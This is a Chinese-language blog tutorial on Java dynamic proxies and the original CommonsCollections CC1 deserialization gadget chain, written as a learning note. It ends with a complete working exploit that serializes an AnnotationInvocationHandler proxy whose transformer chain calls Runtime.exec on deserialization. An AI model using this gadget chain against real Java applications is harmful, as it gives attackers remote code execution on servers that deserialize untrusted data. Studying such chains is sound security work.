---
title: Java动态代理 & CC1链补充
date: 2026-03-11
category: Java
tags: ["web", "ctf", "Java反序列化"]
excerpt: 正版链?还有盗版链?
---

# Java动态代理 & CC1链补充

## 0x01 写在前面

动态代理在挖掘CC1链之前就已经了解过，这两天挖正版CC1链的时候发现对这个概念很模糊

于是在挖掘过程中重新学习动态代理

## 0x02 Java动态代理

首先我们要明确动态代理在Java反序列化攻击的意义

**一个类被动态代理了之后，想要通过代理调用这个类的方法，就一定会调用** **`invoke()`** **方法**

### 基础知识

动态代理的角色和静态代理的一样。需要一个实体类，一个代理类，一个启动器

动态代理的代理类是动态生成的，静态代理的代理类是我们提前写好的

**JDK的动态代理需要了解两个类：**`InvocationHandler 调用处理程序类`和 `Proxy 代理类`

#### InvocationHandler 调用处理程序类

`InvocationHandler`是由代理实例的调用处理程序实现的接口

```Java
public interface InvocationHandler{
    public Object invoke(Object proxy, Method method, Object[] args)
    throws Throwable;
}
```

每个代理实例都有一个关联的调用处理程序`invoke`

```Java
public Object invoke(Object proxy, Method method, Object[] args)
    throws Throwable;
```

`invoke()`方法参数

- `proxy` : 调用该方法的代理实例
- `method` : 所述方法对应于调用代理实例上的接口方法的实例
- `args` : 包含方法调用传递代理实例的参数值的对象的数组，如果接口方法没有参数则为null

#### Proxy  代理

`Proxy`提供了创建动态代理类和实例的静态方法，它也是由这些方法创建的所有动态代理类的超类

```Java
public class Proxy implements java.io.Serializable{
    ...
}
```

动态代理类 （以下简称为代理类 )是一个实现在类创建时在运行时指定的接口列表的类，具有如下所述的行为。 代理接口是由代理类实现的接口。 代理实例是代理类的一个实例。

```Java
public static Object newProxyInstance(ClassLoader loader,
                                      Class<?>[] interfaces,
                                      InvocationHandler h)
    throws IllegalArgumentException
```

该方法返回指定接口的代理类的实例，该接口将方法调用分派给指定的调用处理程序

`newProxyInstance`方法参数：

- `loader` : 定义代理类的类加载器
- `interfaces` : 代理类实现的接口列表
- `h` : 方法调用的调用处理函数

### 代码实现

#### 两个要点

1. 我们代理的是接口，而不是单个用户
2. 代理类是动态生成的，而非静态定死

#### Demo

##### 接口类

```Java
public interface UserService {
    public void add();
    public void delete();
    public void update();
    public void query();
}
```

##### 实现接口实体类

```Java
public class UserServiceImpl implements UserService {

        public void add() {
            System.out.println("增加了一个用户");
        }

        public void delete() {
            System.out.println("删除了一个用户");
        }

        public void update() {
            System.out.println("更新了一个用户");
        }

        public void query() {
            System.out.println("查询了一个用户");
        }
}
```

##### 动态代理实现类

```Java
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;

public class UserProxyInvocationHandler implements InvocationHandler {

    UserService userService;

    public UserProxyInvocationHandler(UserService userService) {
        this.userService = userService;
    }

    public Object getProxy(){
        Object proxy = Proxy.newProxyInstance(userService.getClass().getClassLoader(), new Class[]{UserService.class},this);
        return proxy;
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        log(method);
        Object obj = method.invoke(userService, args);
        return obj;
    }

    public void log(Method method){
        System.out.println("动态代理实现了"+method.getName()+"方法");
    }
}
```

##### 启动类

```Java
public class Client {
    public static void main(String[] args) {
        UserServiceImpl userService = new UserServiceImpl();
        UserProxyInvocationHandler userProxyInvocationHandler =new UserProxyInvocationHandler(userService);
        UserService proxy = (UserService) userProxyInvocationHandler.getProxy();

        proxy.add();
        proxy.delete();
        proxy.update();
        proxy.query();
    }
}
```

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/CC1proxy/CC1proxy.png)
## 0x03 正版CC1链

### 挖掘分析

仍然调用`InvokerTransformer.transform()`作为危险方法

在find Usages时找到了`LazyMap.get()`中`factory`进行了调用

```Java
public class LazyMap extends AbstractMapDecorator implements Map, Serializable {
    ...
    
    public Object get(Object key) {
    // create value for key if key is not currently in the map
    if (map.containsKey(key) == false) {
        Object value = factory.transform(key);
        map.put(key, value);
        return value;
    }
    return map.get(key);
}
    
    ...
}        
```

来看看`factory`是怎么获取的，在`LazyMap`的构造方法中`factory`属性被赋值

同时看到构造方法被protected修饰，应该注意到类中的`decorate()`，看过上篇文章的应该非常熟悉，利用它可以获取`LazyMap`实例对象

```Java
public static Map decorate(Map map, Factory factory) {
    return new LazyMap(map, factory);
}


public static Map decorate(Map map, Transformer factory) {
    return new LazyMap(map, factory);
}


protected LazyMap(Map map, Factory factory) {
    super(map);
    if (factory == null) {
        throw new IllegalArgumentException("Factory must not be null");
    }
    this.factory = FactoryTransformer.getInstance(factory);
}

protected LazyMap(Map map, Transformer factory) {
    super(map);
    if (factory == null) {
        throw new IllegalArgumentException("Factory must not be null");
    }
    this.factory = factory;
}
```

接下来寻找`LazyMap.get()`的触发点

在`AnnotationInvocationHandler.invoke()`中就调用了`get()`

```TypeScript
public Object invoke(Object proxy, Method method, Object[] args) {
    ...

    // Handle annotation member accessors
    Object result = memberValues.get(member);

    ...
}
```

既然是`invoke()`方法，就该想到上面说到的**动态代理**

"一个类被动态代理了之后，想要通过代理调用这个类的方法，就一定会调用 `invoke()` 方法"

既然如此就来找`memberValues`还调用了什么其他方法，在readObject()中其调用了`entrySet()`

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/CC1proxy/CC1proxy1.png)

那我们只需要把`memberValues`改为代理对象，当调用代理对象的方法，那么就会跳到执行 `invoke()` 方法，最终完成整条链子的调用

### 最终exp

```Java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.NoSuchMethodException;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CC1 {

    public static void main(String[] args) throws IOException, NoSuchMethodException, IllegalAccessException, java.lang.reflect.InvocationTargetException, ClassNotFoundException, InstantiationException {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap hashMap = new HashMap();
        Map lazyMap = LazyMap.decorate(hashMap,chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor AIHConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        AIHConstructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) AIHConstructor.newInstance(Target.class, lazyMap);
        Map proxy = (Map) Proxy.newProxyInstance(invocationHandler.getClass().getClassLoader(), new Class[]{Map.class}, invocationHandler);
        invocationHandler = (InvocationHandler) AIHConstructor.newInstance(Target.class, proxy);

        serialize(invocationHandler);
        unserialize("ser.bin");

    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInput ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        return obj;
    }

}
```

被代理的实例

```Java
Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor AIHConstructor = c.getDeclaredConstructor(Class.class, Map.class);
AIHConstructor.setAccessible(true);
InvocationHandler invocationHandler = (InvocationHandler) AIHConstructor.newInstance(Target.class, lazyMap);
```

生成代理对象

```Java
Map proxy = (Map) Proxy.newProxyInstance(invocationHandler.getClass().getClassLoader(), new Class[]{Map.class}, invocationHandler);
invocationHandler = (InvocationHandler) AIHConstructor.newInstance(Target.class, proxy);
```

### 执行效果

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/CC1proxy/CC1proxy2.png)

## 0x04 总结

```Java
调用链 
        InvokeTransformer#transform
                LazyMap#get
                        AnnotationInvocationHandler#readObject
                        

辅助链
ChainedTransformer
ConstantTransformer
HashMap
Map(Proxy)#entrySet
```

![img](https://raw.githubusercontent.com/GEN-d233/gengar/refs/heads/main/public/CC1proxy/CC1proxy3.png)

参考文章

https://drun1baby.top/2022/06/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8702-CC1%E9%93%BE%E8%A1%A5%E5%85%85/

https://drun1baby.top/2022/05/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-01-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%88%A9%E7%94%A8/

https://www.bilibili.com/video/BV16h411z7o9?spm_id_from=333.788.videopod.episodes&vd_source=52eba7627ed3e9842c78702b92c1bba9&p=3
